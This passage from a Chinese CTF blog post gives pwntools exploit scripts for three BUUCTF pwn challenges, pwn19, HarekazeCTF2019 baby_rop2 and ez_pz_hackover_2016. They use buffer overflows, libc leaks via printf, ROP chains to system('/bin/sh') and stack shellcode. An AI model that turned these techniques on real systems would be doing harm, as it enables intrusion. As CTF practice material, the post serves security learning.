+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28222</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn19"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib32/libc.so.6")</span></span><br><span class="line">vuln = <span class="number">0x804852F</span></span><br><span class="line">formats = <span class="number">0x80486A8</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(printf_plt) + p32(vuln) + p32(atoi_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">atoi = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"atoi"</span>,atoi)</span><br><span class="line">libc_base = atoi - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(sys) +p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">sl(<span class="number">-1</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="HarekazeCTF2019-baby-rop2-64位printf泄露"><a href="#HarekazeCTF2019-baby-rop2-64位printf泄露" class="headerlink" title="[HarekazeCTF2019]baby_rop2(64位printf泄露)"></a>[HarekazeCTF2019]baby_rop2(64位printf泄露)</h2><blockquote>
+<p>经常会出现泄露printf的got表不行的情况</p>
+<p>尽量用其他的</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28714</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn21"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">vuln = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">printf_plt = elf.sym[<span class="string">"printf"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) </span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">read = uu64(ru(<span class="string">"What's"</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,read)</span><br><span class="line">libc_base = read - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28640</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn22"</span>)</span><br><span class="line">ru(<span class="string">"Yippie, lets crash: "</span>)</span><br><span class="line">stack = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(stack)</span></span><br><span class="line"><span class="comment">#libc = ELF("./libc-2.27.so")</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">"crashme\x00"</span>  + <span class="string">b'A'</span>*(<span class="number">0x16</span><span class="number">-8</span>+<span class="number">4</span>) + p32(stack<span class="number">-0x1c</span>) + shellcode</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pz1o.top/2100/01/23/BUU-PWN/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">复现wp</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
+    app_key: "FL93w3BBbF9lxiR8X1HI58En",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2021
+        <i class="ri-heart-fill heart_icon"></i> pz1o
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/avatar.jpg" alt="pz1o"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">Home</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">Archives</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">Categories</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">Tags</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">About</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+
+</html>
